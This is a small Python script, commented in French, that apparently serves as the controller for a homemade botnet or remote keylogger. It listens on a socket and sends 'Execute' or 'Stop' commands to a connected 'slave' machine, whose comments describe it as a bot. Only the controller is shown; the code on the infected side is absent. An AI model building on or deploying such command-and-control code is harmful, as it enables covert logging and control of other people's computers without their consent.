import socket as modSocket
import argparse

s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)

s.bind(("localhost", 5000))

s.listen()
conn, addr = s.accept()

print ("Connexion avec l'adresse: ", addr)


#Je crée un argument '--logger', qui va sme permettre de choisir ce que je veux faire avec mon esclave
parser = argparse.ArgumentParser()
parser.add_argument("--logger", help="Permet de communiquer avec les bots", action="store_true")
args = parser.parse_args()

#Si l'argument ets vrai il fais tous ce qui ets contenu dans vette condition
if args.logger:
    action = input("Que voulez vous faire : (start, stop) ")

    def start_log(conn):
        #envoie 'Execute' a la machine esclave, ce qui va permettre de lancer une cation du coté esclave
        conn.send("Execute".encode("utf-8"))
        #reçois la réponse de la machine esclave
        print(conn.recv(1024).decode("utf-8"))
        

    def stop_log(conn):
        #idem start_log sauf qu'içi il lui demande de faire autre chose
        conn.send("Stop".encode("utf-8"))
        print(conn.recv(1024).decode("utf-8"))

    #Je suppose que tua s compris ce que font ces conditions ?
    if action == "start":
        start_log(conn)
    elif action == "stop":
        stop_log(conn)
    else:
        print("ce choix n'existe pas")

    s.close()
